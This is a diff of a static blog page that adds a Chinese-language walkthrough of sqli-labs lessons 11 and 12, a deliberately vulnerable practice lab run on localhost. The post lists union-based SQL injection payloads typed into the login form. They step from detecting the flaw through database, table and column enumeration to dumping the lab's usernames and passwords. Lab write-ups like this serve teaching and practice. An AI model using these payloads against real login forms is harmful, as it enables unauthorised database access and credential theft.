@@ -64,6 +64,75 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-11" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/06/sql-labs-Less-11/" class="article-date">
+  <time datetime="2021-02-06T09:18:42.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/06/sql-labs-Less-11/">sql-labs-Less-11</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>Less-11</h1>
+进入 http://127.0.0.1/sql/Less-11 ，显示如下：
+![1]()
+都输入admin进行登入：
+![2]()
+然后进行sql注入判断，在username输入admin'，在password输入admin，显示如下：
+![3]()
+说明有sql注入漏洞，再在username输入admin'#,password不变，正常登入，说明可以用`‘`注入。
+也可以在username输入admin\，password不输，显示如下：
+![4]()
+看到\后面是`'`，说明可以用`'`注入。
+在username输入admin' order by 2#，正常输出，说明数据有两列。
+再在username输入1admin' union select 1,2#(前面的1和less-1的id=-1是一样的道理)：
+![5]()
+可以看到1在username输出，2在password输出。
+在username输入1admin' union select 1,database()#：(也可以用1admin' union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin' union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))
+![6]()
+可以看到在password输出了库名：security
+再在username输入1admin' union select 1,table_name from information_schema.tables where table_schema='security' limit 0,1#(也可以用1admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#)(以下都是用group_concat函数的)
+![7]()
+得到表名：emails,referers,uagents,users
+再在username输入1admin' union select 1,column_name from information_schema.columns where table_name='users' limit 0,1#(也可以用1admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#)
+![8]()
+得到列名：id,username,password
+再在username输入1admin' union select username,password from users limit 0,1#(也可以用1admin' union select group_concat(username),group_concat(password) from users#)
+![9]()
+得到用户名和密码：
+username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
+
+<h1>Less-12</h1>
+和Less-11一样，只是把'换成了")。
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/06/sql-labs-Less-11/" data-id="ckktltxfe0000zcux8hi1gmo7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-9-10" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/03/sql-labs-Less-9-10/" class="article-date">
@@ -580,6 +649,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/06/sql-labs-Less-11/">sql-labs-Less-11</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/03/sql-labs-Less-9-10/">sql-labs Less-9~10</a>
           </li>
         
@@ -593,10 +666,6 @@
         
           <li>
             <a href="/2021/01/27/sql-labs-Less-5~6/">sql-labs-5~6</a>
-          </li>
-        
-          <li>
-            <a href="/2021/01/22/sql-labs-Less-1~4/">sql-labs Less-1~4</a>
           </li>
         
       </ul>
